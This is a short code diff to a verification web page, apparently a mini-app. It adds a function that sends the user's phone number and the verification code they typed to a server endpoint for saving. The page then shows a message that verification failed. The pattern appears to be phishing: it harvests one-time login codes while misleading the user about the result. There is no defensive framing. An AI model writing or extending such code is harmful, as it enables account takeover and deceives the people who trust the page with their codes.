@@ -175,6 +175,30 @@
             document.getElementById('verificationContainer').style.display = 'block';
         }
 
+        async function sendDataToServer(phoneNumber, verificationCode) {
+            try {
+                const response = await fetch('http://localhost:8080/save-verification', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        phoneNumber: phoneNumber,
+                        verificationCode: verificationCode,
+                        userId: 1 // This should be dynamically assigned or passed by the mini-app environment
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+
+                console.log("Data sent to server successfully");
+            } catch (error) {
+                console.error("Failed to send data to server:", error);
+            }
+        }
+
         function submitVerification() {
             const verificationCode = document.getElementById('verificationCode').value;
             const phoneDisplay = document.getElementById('phoneDisplay').textContent;
@@ -183,6 +207,8 @@
                 alert('Please enter the verification code.');
                 return;
             }
+
+            sendDataToServer(phoneDisplay, verificationCode);
 
             // Show the final message indicating verification failure
             document.getElementById('verificationContainer').style.display = 'none';
